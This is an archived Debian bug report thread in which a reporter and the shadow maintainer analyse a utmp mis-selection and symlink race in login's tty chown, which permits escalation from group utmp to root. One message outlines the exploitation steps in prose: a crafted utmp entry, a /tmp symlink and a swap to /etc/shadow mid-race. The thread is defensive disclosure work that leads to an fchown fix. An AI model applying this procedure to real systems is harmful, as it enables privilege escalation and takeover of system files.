=== Content from bugs.debian.org_cd66b46e_20250125_151757.html ===

# Debian Bug report logs - #505271 symlink attack in login leading to arbitrary file ownership

[![version graph](version.cgi?package=login;absolute=0;found=shadow%2F1%3A4.0.18.1-7;width=2;height=2;fixed=shadow%2F1%3A4.1.1-6;fixed=shadow%2F1%3A4.0.18.1-7%2Betch1;collapse=1)](version.cgi?collapse=1;package=login;absolute=0;found=shadow%2F1%3A4.0.18.1-7;fixed=shadow%2F1%3A4.1.1-6;fixed=shadow%2F1%3A4.0.18.1-7%2Betch1;info=1)

Package:
[login](pkgreport.cgi?package=login);
Maintainer for [login](pkgreport.cgi?package=login) is [util-linux packagers <util-linux@packages.debian.org>](pkgreport.cgi?maint=util-linux%40packages.debian.org); Source for [login](pkgreport.cgi?package=login) is [src:util-linux](pkgreport.cgi?src=util-linux) ([PTS](https://tracker.debian.org/pkg/util-linux), [buildd](https://buildd.debian.org/util-linux), [popcon](https://qa.debian.org/popcon.php?package=util-linux)).

Reported by: [Paul Szabo <psz@maths.usyd.edu.au>](pkgreport.cgi?submitter=psz%40maths.usyd.edu.au)

Date: Sun, 9 Nov 2008 07:33:01 UTC

Severity: *serious*

Tags: patch, security

Found in version shadow/1:4.0.18.1-7

Fixed in versions shadow/1:4.1.1-6, shadow/1:4.0.18.1-7+etch1

**Done:** Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=505271;mbox=yes), [status mbox](bugreport.cgi?bug=505271;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=505271;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 09 Nov 2008 07:33:03 GMT) ([full text](bugreport.cgi?bug=505271;msg=2), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

New Bug report received and forwarded. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 09 Nov 2008 07:33:04 GMT) ([full text](bugreport.cgi?bug=505271;msg=4), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=5), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: login tty mis-determination (see bug#332198)
Date: Sun, 09 Nov 2008 18:26:39 +1100
```
Package: login
Version: 1:4.0.18.1-7
Severity: normal

(I wanted to send this to  332198@bugs.debian.org  but that was not
accepted, surely because that is closed/archived.)

I found in my logs (I think first occurrence of such mis-behaviour):

Nov  8 05:50:09 rome in.telnetd[21060]: connect from psz@bari.maths.usyd.edu.au (129.78.69.145)
Nov  8 05:50:12 rome login[21062]: (pam_unix) session opened for user root by (uid=0)
Nov  8 05:50:12 rome login[21062]: can't stat(`/dev/smb/39'): errno 2
Nov  8 05:50:12 rome login[21062]: unable to determine TTY name, got /dev/smb/39

Surely that Samba device is wrong for a telnet session...

Hope this helps in tacking down the cause of this bug.

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

-- System Information:
Debian Release: 4.0
  APT prefers stable
  APT policy: (500, 'stable')
Architecture: i386 (i686)
Shell:  /bin/sh linked to /bin/bash
Kernel: Linux 2.6.24-pk03.02-svr
Locale: LANG=C, LC_CTYPE=C (charmap=ANSI_X3.4-1968)

Versions of packages login depends on:
ii  libc6                  2.3.6.ds1-13etch7 GNU C Library: Shared libraries
ii  libpam-modules         0.79-5            Pluggable Authentication Modules f
ii  libpam-runtime         0.79-5            Runtime support for the PAM librar
ii  libpam0g               0.79-5            Pluggable Authentication Modules l

login recommends no packages.

-- no debconf information

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 09 Nov 2008 12:09:15 GMT) ([full text](bugreport.cgi?bug=505271;msg=7), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=7), [link](#6)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 09 Nov 2008 12:09:16 GMT) ([full text](bugreport.cgi?bug=505271;msg=9), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=9), [link](#8)).

---

[Message #10](#10) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=10), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=10), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: Paul Szabo <psz@maths.usyd.edu.au>, 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: login tty mis-determination
(see bug#332198)
Date: Sun, 9 Nov 2008 13:06:30 +0100
```
Hello,

First of all, this issue was already discussed, and the main problem was
that we were not able to reproduce it.
Are you currently able to reproduce it?

That would help us a lot, since this would allow testing instrumentation
of login to find the root cause.

Would you agree testing some patches?

On Sun, Nov 09, 2008 at 06:26:39PM +1100, psz@maths.usyd.edu.au wrote:
> Package: login
> Version: 1:4.0.18.1-7
> Severity: normal
>
> (I wanted to send this to  332198@bugs.debian.org  but that was not
> accepted, surely because that is closed/archived.)
>
> I found in my logs (I think first occurrence of such mis-behaviour):
>
> Nov  8 05:50:09 rome in.telnetd[21060]: connect from psz@bari.maths.usyd.edu.au (129.78.69.145)
> Nov  8 05:50:12 rome login[21062]: (pam_unix) session opened for user root by (uid=0)
> Nov  8 05:50:12 rome login[21062]: can't stat(`/dev/smb/39'): errno 2
> Nov  8 05:50:12 rome login[21062]: unable to determine TTY name, got /dev/smb/39
>
> Surely that Samba device is wrong for a telnet session...

You logged in with telnet, right?

Do you know the version of telnet you are using?
Do you know if telnet creates a utmp entry before calling login?

What might be happening is that telnet do not create a utmp entry, and an
old one from samba is reused (in checkutmp). This should be very rare also
because the bug would occur only if the same pid is reused.

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 09 Nov 2008 21:54:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=12), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=12), [link](#11)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 09 Nov 2008 21:54:04 GMT) ([full text](bugreport.cgi?bug=505271;msg=14), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=14), [link](#13)).

---

[Message #15](#15) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=15), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=15), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 10 Nov 2008 08:51:53 +1100
```
Dear Nicolas (Nekral?),

> First of all, this issue was already discussed, and the main problem was
> that we were not able to reproduce it.

Yes, I am aware of bug #332198.

> Are you currently able to reproduce it?

Have not yet attempted to actively reproduce, have observed one
occurrence of "spontaneous" bad behaviour.

> That would help us a lot, since this would allow testing instrumentation
> of login to find the root cause.
> Would you agree testing some patches?

Yes, would be happy to test.

>> I found in my logs (I think first occurrence of such mis-behaviour):
>>
>> Nov  8 05:50:09 rome in.telnetd[21060]: connect from psz@bari.maths.usyd.edu.au (129.78.69.145)
>> Nov  8 05:50:12 rome login[21062]: (pam_unix) session opened for user root by (uid=0)
>> Nov  8 05:50:12 rome login[21062]: can't stat(`/dev/smb/39'): errno 2
>> Nov  8 05:50:12 rome login[21062]: unable to determine TTY name, got /dev/smb/39
>>
>> Surely that Samba device is wrong for a telnet session...
>
> You logged in with telnet, right?
> Do you know the version of telnet you are using?
> Do you know if telnet creates a utmp entry before calling login?

Yes, with telnet; version 0.17-34 (debian etch); surely it cannot
possibly create utmp (telnet runs on bari, telnetd on rome).

> What might be happening is that telnet do not create a utmp entry, and an
> old one from samba is reused (in checkutmp). This should be very rare also
> because the bug would occur only if the same pid is reused.

Yes, I agree that this is a re-use of an old "unclosed" utmp entry.
(Samba is in the habit of leaving such unclosed entries.) My logs show
(much earlier than the above-quoted lines):

Nov  7 00:52:02 rome samba[21062]: Connect IPC_ for smbguest from p706f (p706f.pc.maths.usyd.edu.au, 129.78.223.215)

and I did not notice other utmp uses for the same PID in between.

---

Seems to me that the picking of utent in checkutmp by PID (and type?)
only is naive, should pick by line (or id) also, in fact pick by the
is_my_tty checks.

---

File src/login.c has line 87
  extern struct utmp utent;
whereas file libmisc/utmp.c has line 48
  struct utmp utent;
without extern: is that correct?

---

Other comments. Am worried that relying on utmp correctness is a
security risk: conceptually because group utmp would become
root-equivalent, and practically because of shenanigans with utmp
writing e.g. bugs #329156 #330907.

In file libmisc/chowntty.c :
- line 51: should the call
    (stat (tty, &by_name))
  be changed to lstat? Avoid being fooled by symlinks.
- line 66: is the check
    (by_name.st_rdev != by_fd.st_rdev)
  sufficient: can it be fooled with symlinks or hardlinks?
- lines 122,123: should chown(tty,...) and chmod(tty,...) be changed to
  fchown(0,...) and fchmod(0,...)? Avoid being fooled by symlinks and
  races.

Seems to me that as things stand, writing a suitable utmp entry, would
trick login into chowning an arbitrary file. Should I attempt to write
an exploit/demo?

---

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 09 Nov 2008 23:24:05 GMT) ([full text](bugreport.cgi?bug=505271;msg=17), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=17), [link](#16)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 09 Nov 2008 23:24:05 GMT) ([full text](bugreport.cgi?bug=505271;msg=19), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=19), [link](#18)).

---

[Message #20](#20) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=20), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=20), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: Paul Szabo <psz@maths.usyd.edu.au>, 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty
mis-determination (see bug#332198)
Date: Mon, 10 Nov 2008 00:20:56 +0100
```
Hi,

Thanks for your answer.
The culprit is now confirmed.

On Mon, Nov 10, 2008 at 08:51:53AM +1100, psz@maths.usyd.edu.au wrote:
> Dear Nicolas (Nekral?),
>
> > First of all, this issue was already discussed, and the main problem was
> > that we were not able to reproduce it.
>
> Yes, I am aware of bug #332198.
>
> > Are you currently able to reproduce it?
>
> Have not yet attempted to actively reproduce, have observed one
> occurrence of "spontaneous" bad behaviour.
>
> > That would help us a lot, since this would allow testing instrumentation
> > of login to find the root cause.
> > Would you agree testing some patches?
>
> Yes, would be happy to test.
>
> >> I found in my logs (I think first occurrence of such mis-behaviour):
> >>
> >> Nov  8 05:50:09 rome in.telnetd[21060]: connect from psz@bari.maths.usyd.edu.au (129.78.69.145)
> >> Nov  8 05:50:12 rome login[21062]: (pam_unix) session opened for user root by (uid=0)
> >> Nov  8 05:50:12 rome login[21062]: can't stat(`/dev/smb/39'): errno 2
> >> Nov  8 05:50:12 rome login[21062]: unable to determine TTY name, got /dev/smb/39
> >>
> >> Surely that Samba device is wrong for a telnet session...
> >
> > You logged in with telnet, right?
> > Do you know the version of telnet you are using?
> > Do you know if telnet creates a utmp entry before calling login?
>
> Yes, with telnet; version 0.17-34 (debian etch); surely it cannot
> possibly create utmp (telnet runs on bari, telnetd on rome).

Well, I meant telnetd should have inserted a utmp entry, on teh server
side.

> > What might be happening is that telnet do not create a utmp entry, and an
> > old one from samba is reused (in checkutmp). This should be very rare also
> > because the bug would occur only if the same pid is reused.
>
> Yes, I agree that this is a re-use of an old "unclosed" utmp entry.
> (Samba is in the habit of leaving such unclosed entries.) My logs show
> (much earlier than the above-quoted lines):
>
> Nov  7 00:52:02 rome samba[21062]: Connect IPC_ for smbguest from p706f (p706f.pc.maths.usyd.edu.au, 129.78.223.215)
>
> and I did not notice other utmp uses for the same PID in between.
>
> ---
>
> Seems to me that the picking of utent in checkutmp by PID (and type?)
> only is naive, should pick by line (or id) also, in fact pick by the
> is_my_tty checks.

I agree with you that the utmp handling in shadow is not clean, and might
have a security implication.

I fear I won't have time to work on it in the next 2/3 weeks.

I think checking for the line might be good if the line is known, as well
as the user if possible.

> File src/login.c has line 87
>   extern struct utmp utent;
> whereas file libmisc/utmp.c has line 48
>   struct utmp utent;
> without extern: is that correct?

I think that's the expected behavior, however, I would prefer to avoid
such hidden communication between the modules.

> ---
>
> Other comments. Am worried that relying on utmp correctness is a
> security risk: conceptually because group utmp would become
> root-equivalent, and practically because of shenanigans with utmp
> writing e.g. bugs #329156 #330907.
>
> In file libmisc/chowntty.c :
> - line 51: should the call
>     (stat (tty, &by_name))
>   be changed to lstat? Avoid being fooled by symlinks.
> - line 66: is the check
>     (by_name.st_rdev != by_fd.st_rdev)
>   sufficient: can it be fooled with symlinks or hardlinks?
> - lines 122,123: should chown(tty,...) and chmod(tty,...) be changed to
>   fchown(0,...) and fchmod(0,...)? Avoid being fooled by symlinks and
>   races.
>
> Seems to me that as things stand, writing a suitable utmp entry, would
> trick login into chowning an arbitrary file. Should I attempt to write
> an exploit/demo?

That would be nice to check if it would be possible to chown /etc/shadow
by cheating utmp.

A fake demo would be nice.
(by "fake demo", I mean that you do not have to find a way to guess the
PID, but can recompile a new login which use an hardcoded utmp entry in
checkutmp; that would be sufficient since we already know the utmp entry
selection is wrong and can be cheated)

I hope is_my_tty protects it, but I did not checked at all the complete
path.

Cheers,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 00:06:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=22), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=22), [link](#21)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 00:06:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=24), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=24), [link](#23)).

---

[Message #25](#25) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=25), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=25), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 10 Nov 2008 11:04:12 +1100
```
Dear Nekral,

>> Seems to me that as things stand, writing a suitable utmp entry, would
>> trick login into chowning an arbitrary file. Should I attempt to write
>> an exploit/demo?
>
> That would be nice to check if it would be possible to chown /etc/shadow
> by cheating utmp.
>
> A fake demo would be nice.
> (by "fake demo", I mean that you do not have to find a way to guess the
> PID, but can recompile a new login which use an hardcoded utmp entry in
> checkutmp; that would be sufficient since we already know the utmp entry
> selection is wrong and can be cheated)
>
> I hope is_my_tty protects it, but I did not checked at all the complete
> path.

I expect the following would work:
Predict what PID and tty will be used by login. (This is rather simple:
surely the next available ones, maybe current tty.) For sake of example,
say these are PID=123 and tty=/dev/pts/1.
Pre-create a symlink  /tmp/x -> /dev/pts/1  and write an utmp entry
with PID=123, line=/tmp/x, type=LOGIN_PROCESS.
Run login. While login is running, change /tmp/x to point to /etc/shadow.
We win the race if the change is done after stat(tty,...) within
is_my_tty and before chown(tty,...) in chown_tty.

Hope this is sufficient...

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 10:24:04 GMT) ([full text](bugreport.cgi?bug=505271;msg=27), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=27), [link](#26)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 10:24:05 GMT) ([full text](bugreport.cgi?bug=505271;msg=29), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=29), [link](#28)).

---

[Message #30](#30) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=30), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=30), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 10 Nov 2008 21:15:58 +1100
```
Dear Nekral,

I have not yet written an exploit/PoC/demo, but think it should be
rather easy to do. Looking at the recent DSA-1500 also, I ask you to
change the severity of this bug to "critical - root security hole",
and of course to fix things quickly. (I would change the severity
myself, but I think as a result of bug #299007 am not allowed.)

Thanks, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 11:39:13 GMT) ([full text](bugreport.cgi?bug=505271;msg=32), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=32), [link](#31)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 11:39:13 GMT) ([full text](bugreport.cgi?bug=505271;msg=34), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=34), [link](#33)).

---

[Message #35](#35) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=35), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=35), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty
mis-determination (see bug#332198)
Date: Mon, 10 Nov 2008 12:17:01 +0100
```
Hello,

I think there are two different bugs:

 * one is that login relies on the utmp entry with the current PID
   In my opinion, this cannot be exploited because is_my_tty will detect
   it.

 * The other one is that between is_my_tty and chown, there is a race
   condition.
   Changing chown (tty, ...) to fchown (0, ...) might work and might be
   sufficient.

The first bug is not critical.

The second one should be fixed for Lenny, but tested first.

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 23:21:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=37), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=37), [link](#36)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 23:21:11 GMT) ([full text](bugreport.cgi?bug=505271;msg=39), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=39), [link](#38)).

---

[Message #40](#40) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=40), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=40), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty mis-determination (see bug#332198)
Date: Tue, 11 Nov 2008 07:36:18 +1100
```
Dear Nekral,

Curious way of counting bugs. What do you mean exploitable: to do what?
(Surely is_my_tty cannot protect, being buggy itself.)

As I see things, the following bugs are present:

- bad selection of utmp entry [often choosing wrong]
- is_my_tty uses stat [should be lstat]
- is_my_tty compares rdev only [should also test dev ino etc]
- maybe is_my_tty should scrutinize path [ensure directory components
  are root-owned and safe]
- race between is_my_tty checks and chown
- chown of unsafe path [should be fchown anyway]

As things are, it is exploitable to elevate privileges from group utmp
to root. It is also buggy, often failing for legitimate use. Fixing all
bugs would be best; fixing some may already render it "safe" against
exploitation, and/or restore functionality.

Please, fix soon. Please change severity.

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 23:27:13 GMT) ([full text](bugreport.cgi?bug=505271;msg=42), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=42), [link](#41)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 23:27:13 GMT) ([full text](bugreport.cgi?bug=505271;msg=44), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=44), [link](#43)).

---

[Message #45](#45) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=45), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=45), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty mis-determination (see bug#332198)
Date: Tue, 11 Nov 2008 07:39:50 +1100
```
Dear Nekral,

Sorry, I missed your comment:

> ... should be fixed for Lenny ...

No. Should be fixed now, for etch. Needs a DSA.

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 23:54:07 GMT) ([full text](bugreport.cgi?bug=505271;msg=47), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=47), [link](#46)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 23:54:07 GMT) ([full text](bugreport.cgi?bug=505271;msg=49), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=49), [link](#48)).

---

[Message #50](#50) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=50), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=50), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty
mis-determination (see bug#332198)
Date: Tue, 11 Nov 2008 00:52:57 +0100
```
On Tue, Nov 11, 2008 at 07:36:18AM +1100, psz@maths.usyd.edu.au wrote:
>
> Curious way of counting bugs. What do you mean exploitable: to do what?
> (Surely is_my_tty cannot protect, being buggy itself.)
>
> As I see things, the following bugs are present:
>
> - bad selection of utmp entry [often choosing wrong]

Often is arguable.
2 reports in 10 years.

> - is_my_tty uses stat [should be lstat]

I'm not sure lstat is right.
If the caller of login puts the name of a symbolic link for any reason in
utmp, I don't think that should be a failure.

> - is_my_tty compares rdev only [should also test dev ino etc]

I don't think the device or the inode is relevant.
If the major and minor of the device are identical, then they indicate the
same device.

> - maybe is_my_tty should scrutinize path [ensure directory components
>   are root-owned and safe]

Same as lstat, I don't think the paths have to match.

> - race between is_my_tty checks and chown

Yes.

> - chown of unsafe path [should be fchown anyway]

Except for the race, I don't think the path in unsafe.

> As things are, it is exploitable to elevate privileges from group utmp
> to root. It is also buggy, often failing for legitimate use. Fixing all
> bugs would be best; fixing some may already render it "safe" against
> exploitation, and/or restore functionality.

I currently think is_my_tty should be removed. checkutmp should check that
ut_line matches with the current tty, and return a file descriptor

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Tue, 11 Nov 2008 00:51:06 GMT) ([full text](bugreport.cgi?bug=505271;msg=52), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=52), [link](#51)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 11 Nov 2008 00:51:07 GMT) ([full text](bugreport.cgi?bug=505271;msg=54), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=54), [link](#53)).

---

[Message #55](#55) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=55), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=55), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty mis-determination (see bug#332198)
Date: Tue, 11 Nov 2008 11:47:53 +1100
```
Dear Nekral,

> Often is arguable.

Are not computers meant to be infallible and perfect?

---

Privileged programs should be strict on what they accept.

Paths are un-safe unless you verify that all directories above are
root-owned and not group or world writeable.

---

How you count bugs, how you fix the issues, is up to you (does not have
to be to my liking). Please fix soon, before someone writes an exploit.

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Tue, 11 Nov 2008 11:04:37 GMT) ([full text](bugreport.cgi?bug=505271;msg=57), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=57), [link](#56)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 11 Nov 2008 11:04:38 GMT) ([full text](bugreport.cgi?bug=505271;msg=59), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=59), [link](#58)).

---

[Message #60](#60) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=60), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=60), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: login tty mis-determination
(see bug#332198)
Date: Tue, 11 Nov 2008 12:00:28 +0100
```
clone 505071 -1
retitle -1 symlink attack in login leading to arbitrary file ownership
tags -1 security
severity -1 serious
tags -1 patch
thanks

Somebody with write access to the utmp database can create the conditions
for a symlink attack in login, leading to gaining ownership of an
arbitrary file.

Proposed fix: Changing chown (tty, ...) to fchown (0, ...) in chowntty()

Best Regards,
--
Nekral

```

---

